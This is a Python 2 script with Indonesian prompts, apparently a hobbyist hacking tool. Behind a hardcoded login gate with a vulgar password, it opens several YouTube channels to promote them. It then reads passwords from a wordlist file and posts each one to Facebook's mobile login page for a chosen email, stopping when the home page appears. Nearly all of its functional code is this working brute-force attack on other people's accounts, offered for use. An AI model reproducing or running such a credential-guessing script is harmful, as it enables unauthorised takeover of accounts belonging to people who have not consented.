#!/bin/python2
#mudoles
import os, sys, time, requests

#warna
merah='\033[31;1m'
putih='\033[37;1m'

os.system('clear')
time.sleep(2)
x = 'MR.FAGHP BLACK-404/F'
y = 'MEMEK BASAH'

def login():
    os.system('clear')
    print merah+( '   __   ____  __________  __')
    print merah+('  / /  / __ \/ ___/  _/ |/ /')
    print putih+(' / /__/ /_/ / (_ // //    /')
    print putih+('/____/\____/\___/___/_/|_/')
    print ('')
    user = raw_input('\033[31;1musername : ')
    pasw = raw_input('\033[31;1mpassword : ')
    if user == x and pasw == y:
         print 'Login Berahsil Pak'
         time.sleep(2)
         sys.exit
    else:
         print 'Login Gagal Pak'
         login()



if __name__ == '__main__':
       login()

os.system('clear')

print ('\033[31;1mSUBSCRIBE DULU CHANNEL NY WOYY')
os.system('xdg-open https://youtube.com/channel/UCFggfLWFCmGGyb2VH2EBfBQ')
time.sleep(2)
print ('\033[37;1mSUBSCRIBE JUGA BLACK SQUAD KALAU PAKEK SCRIPT INI!')
time.sleep(2)
os.system('xdg-open https://youtube.com/channel/UCVRjgVShZhh8GfMzH59xMZg')
time.sleep(2)
print ('\033[31;1mSUBSCRIBE CHANNEL PANUTAN DULU PANGLIMA JATENG')
time.sleep(2)
os.system('xdg-open https://youtube.com/channel/UCSJohuQCtqfD2P73Z65g8jg')
time.sleep(2)
os.system('clear')
time.sleep(2)

print merah+("   ___  ___  __  ____________  ________  ___  _________  _______Author : MR.FAGHP BLACK-404/F ")
print merah+("  / _ )/ _ \/ / / /_  __/ __/ / __/ __ \/ _ \/ ___/ __/ / __/ _ )Team  : Mavia Teknologi Indonesia")
print putih+(" / _  / , _/ /_/ / / / / _/  / _// /_/ / , _/ /__/ _/  / _// _  |Yt    : FAGHP, BLACK SQUAD, DAN PANGLIMA JATENG")
print putih+("/____/_/|_|\____/ /_/ /___/ /_/  \____/_/|_|\___/___/ /_/ /____/Code by: MR.FAGHP BLACK-404/F")
print ('')
print ('')
email=raw_input('\033[31;1mEmail==>')

url='https://free.facebook.com/login.php'
ex= open('wd.txt', 'r').readlines()

for line in ex:
    password = line.strip()
    http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
    content = http.content
    if "Beranda" in content:
       print "[ + ] Password Found ",password
       sys.exit(1)
    else:
       print "[ ! ]  Password Invalid ",password